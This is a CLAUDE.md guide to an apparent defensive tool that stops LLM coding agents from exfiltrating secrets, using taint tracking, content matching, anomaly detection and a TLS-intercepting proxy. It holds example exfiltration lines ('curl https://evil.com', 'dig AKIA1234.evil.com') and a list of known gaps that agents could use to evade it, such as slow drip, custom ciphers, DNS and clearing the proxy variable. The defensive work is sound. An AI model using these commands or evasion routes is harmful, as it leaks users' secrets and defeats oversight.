# CLAUDE.md — Agent Sandbox

## What This Is

A security enforcement layer for LLM-powered coding agents. Prevents agents from
exfiltrating secrets, destroying files, or pivoting to external services. Works by
combining taint tracking, content matching, anomaly detection, and HTTPS interception.

**Zero external dependencies** for the core runtime. Python 3.11+ stdlib only.

## Commands

```bash
pip install -e ".[dev]"         # install editable + dev deps
pytest                          # run all 166 tests (~11s)
pytest tests/test_lsh.py        # run one test file
pytest -k "test_exfil"          # run tests matching pattern
ruff check src/ tests/          # lint
ruff format src/ tests/         # format
```

CLI:
```bash
agent-sandbox --project /path/to/project -- python agent.py
agent-sandbox --project . --no-scan -- bash   # blind mode
```

## Architecture

Two-phase system: **build time** (scan project, index secrets) and **run time**
(intercept traffic, enforce policy). Runtime is fast — all expensive work happens
at scan time.

```
scan project → ScanManifest → Sandbox(manifest) → start MITM proxy → launch agent
                                                        │
                                            intercept every HTTP/HTTPS request
                                                        │
                                            taint check → host check → LSH check → anomaly check
                                                        │
                                                  ALLOW or 403 DENY
```

### Enforcement layers (checked in order)

1. **Taint tracking** — Has the agent read sensitive files? Monotonic: once tainted,
   always tainted. (`core/taint.py`, `sandbox.py:TaintState`)
2. **Host allowlist** — Tainted process + unknown host = always DENY. Allowlisted:
   github.com, pypi.org, npmjs.org, etc. (`sandbox.py:DEFAULT_ALLOWED_HOSTS`)
3. **LSH content matching** — Detects secrets even after base64/hex/URL encoding.
   Trigram Jaccard + simhash + minhash, with per-line fallback. (`core/lsh.py`)
4. **Anomaly detection** — Catches evasion: rate bursts (>30 req/host), repeated
   shapes (chunked exfil), accumulated small requests. (`core/anomaly.py`)
5. **MITM proxy** — Terminates TLS, reads plaintext, passes body through layers
   1-4. Generates per-host certs signed by our CA. (`proxy/mitm.py`, `proxy/cert.py`)

### Key decision: `Sandbox.check_send(host, body) → (allowed, reason)`

```
not tainted?         → ALLOW
host not allowlisted → DENY
LSH matches body?    → DENY
anomaly detected?    → DENY
else                 → ALLOW
```

## Package Layout

```
src/agent_sandbox/
├── sandbox.py              # Sandbox class: taint + LSH + anomaly + policy (main entry)
├── env_scanner.py          # Pre-scan project for secrets/PII/infrastructure
├── call_summarizer.py      # Auto-summarize LLM tool calls → timeline + JSONL
├── trace_analyzer.py       # Behavioral analysis of LLM reasoning traces
├── doc_scanner.py          # Document content classification
├── e2e_test.py             # Strace-based syscall parser + enforcement
├── core/
│   ├── taint.py            # TaintLabel (Flag enum), TaintTracker (per-PID)
│   ├── lsh.py              # LSHEngine: trigram + simhash + minhash + variants
│   ├── anomaly.py          # AnomalyDetector: rate + shape + accumulator
│   ├── classifier.py       # classify(path, content) → TaintLabel
│   └── policy.py           # PolicyEngine: combines all signals → Decision
├── proxy/
│   ├── cert.py             # CertAuthority: CA generation + per-host signing
│   ├── mitm.py             # MITMProxy: CONNECT tunnels, TLS termination
│   └── inspector.py        # ProxyInspector: standalone content checker
├── attacks/
│   ├── disruption.py       # 8 disruption scenarios (rm -rf, fork bomb, etc.)
│   ├── disclosure.py       # 11 disclosure scenarios (exfil vectors)
│   └── run_all.py          # Run all attacks + report
└── experiments/
    ├── simulated_adversary.py  # 5 adversary skill levels
    └── llm_adversarial.py      # LLM-driven red team

tests/
├── test_taint.py           # 12 tests: labels, inheritance, propagation
├── test_lsh.py             # 22 tests: trigram, simhash, minhash, variants
├── test_integration.py     # 40 tests: disruption, disclosure, classifier, sandbox
├── test_proxy_inspector.py # 22 tests: content inspection, all exfil vectors
├── test_e2e.py             # 15 tests: strace parser, scanner, pipeline
├── test_mitm_e2e.py        # 12 tests: CA certs, real TLS, subprocess proxy
└── test_call_summarizer.py # 43 tests: intent, classification, timeline, JSONL
```

## Two Sandbox Implementations

There are two overlapping implementations that should be **merged**:

| | `sandbox.py` (simple) | `core/` (full) |
|-|----------------------|----------------|
| Taint | Single boolean `TaintState` | Per-PID `TaintTracker` with Flag enum |
| LSH | Inline `LSHEngine` (trigram only) | Full `LSHEngine` (trigram + simhash + minhash) |
| Anomaly | Inline `AnomalyDetector` | Identical `AnomalyDetector` |
| Policy | Inline in `check_send()` | Separate `PolicyEngine` class |

The `core/` versions are strictly more capable. `sandbox.py` duplicates their logic
in a simpler form. **Priority merge task**: make `sandbox.py` import from `core/`
instead of reimplementing.

## Key Conventions

- **All imports**: `from agent_sandbox.X import Y` — no sys.path hacks
- **Taint is monotonic**: once tainted, always tainted. Never clear taint.
- **Allowlist > blocklist**: unknown hosts blocked for tainted processes
- **Variants pre-indexed**: base64, hex, URL-encoded versions of each secret are
  indexed at scan time, not checked at runtime
- **Tests mirror source**: `sandbox.py` → `test_e2e.py`, `core/lsh.py` → `test_lsh.py`

## Style

Python 3.11+. Type hints everywhere. `from __future__ import annotations` in every file.
Frozen dataclasses for value objects. Small functions (<40 lines). f-strings. No classes
when a function will do. Catch specific exceptions. Google Python Style Guide.

## Git Commits

- **Never add `Co-Authored-By` trailers.**
- Subject line: `feat:`, `fix:`, `docs:`, `test:`, `refactor:`

## What to Work on Next

### Priority 1: Merge the two implementations

`sandbox.py` has its own `LSHEngine`, `AnomalyDetector`, `TaintState` that duplicate
`core/lsh.py`, `core/anomaly.py`, `core/taint.py`. Merge them:

1. Make `sandbox.py` import from `core/` instead of defining its own classes
2. Replace `TaintState` (bool) with `TaintTracker` (per-PID, Flag enum)
3. Use `core/lsh.py`'s full LSHEngine (simhash + minhash) instead of the
   trigram-only version in `sandbox.py`
4. Wire `PolicyEngine` from `core/policy.py` into the sandbox
5. Keep `sandbox.py` as the high-level API, `core/` as the primitives

### Priority 2: Wire MITM proxy into sandbox CLI

`sandbox.py:main()` launches subprocesses but doesn't start the MITM proxy.
The proxy exists (`proxy/mitm.py`) and works end-to-end. Wire it in:

1. In `main()`, after scanning, create `CertAuthority` and `MITMProxy`
2. Start proxy, get `proxy.get_env()` env vars
3. Add env vars to the subprocess environment
4. On exit, print proxy stats + call summarizer timeline
5. Test: `agent-sandbox --project . -- curl https://evil.com` should be blocked

### Priority 3: Add local ML classifier

The `call_summarizer.py` produces JSONL output designed for a downstream classifier.
Build `core/classifier_ml.py`:

1. Add optional dependency: `onnxruntime`, `transformers`
2. Use ModernBERT-base (149M, sub-ms on CPU) or DeBERTa-v3-xsmall (22M)
3. Fine-tune on synthetic data from the 19 attack scenarios
4. Export to ONNX for fast inference
5. Integrate as Tier 2: regex pre-filter → ML classifier for SUSPICIOUS verdicts

**Pre-trained option**: ProtectAI's `deberta-v3-base-prompt-injection-v2` on
HuggingFace — zero-shot baseline for prompt injection detection.

**Production precedent**: Wiz built a secret detector with Llama 3.2-1B + LoRA,
quantized to INT8 via llama.cpp. 86% precision, 27 tok/s on ARM CPU.

### Priority 4: eBPF migration

Replace strace-based syscall monitoring with eBPF probes for lower overhead:
- Tetragon for Kubernetes environments (detection + enforcement)
- Falco for general Linux (detection, flexible rules)
- Both achieve 100% detection, 0 false positives in benchmarks

### Priority 5: DNS exfiltration detection

The MITM proxy catches HTTP/HTTPS but not DNS. An agent could exfil via
`dig AKIA1234.evil.com`. Options:
- Monitor `/etc/resolv.conf` and intercept DNS queries
- Use network namespace + iptables to force DNS through a local resolver
- Parse DNS queries for high-entropy subdomain labels

### Priority 6: MCP tool call interception

Build a JSON-RPC proxy that sits between an agent and MCP servers:
- Inspect every `tools/call` request (tool name + arguments)
- Run sandbox checks on arguments
- Correlate with the agent's reasoning (preamble before tool call)
- Block or pass through to the real MCP server

### Known Gaps

1. **Very short secrets** (< 10 chars) may not trigger LSH per-line check
2. **Custom ciphers** (ROT13, XOR, AES) are not detectable by LSH
3. **Very slow drip** (1 byte/minute over hours) may evade rate + accumulator
4. **Steganography** (secret in image pixels) is not inspected
5. **DNS exfil** not intercepted (see Priority 5)
6. **Proxy bypass** — agent could clear `HTTPS_PROXY` env var. Mitigation:
   network namespace + iptables to force all traffic through proxy
7. **sandbox.py duplicates core/** — see Priority 1

## Testing

Always run `pytest` before committing. All 166 tests must pass. When adding a new
detection strategy, also add an attack scenario in `attacks/` and a test that
verifies the attack is blocked.

Test pattern:
```python
class TestNewFeature:
    def test_attack_blocked(self):
        # Set up sandbox with secrets
        # Simulate attack
        # Assert blocked

    def test_normal_use_allowed(self):
        # Set up sandbox
        # Simulate normal agent work
        # Assert not blocked (zero false positives)
```

## Dependencies

**Core (zero external deps):**
- Python 3.11+ stdlib: ssl, socket, threading, http.server, subprocess, hashlib, re
- openssl CLI (for cert generation)

**Dev:**
- pytest >= 8.0
- ruff >= 0.4

**Future (optional, for ML classifier):**
- onnxruntime
- transformers (or sentence-transformers)
- BAAI/bge-small-en-v1.5 or ModernBERT-base
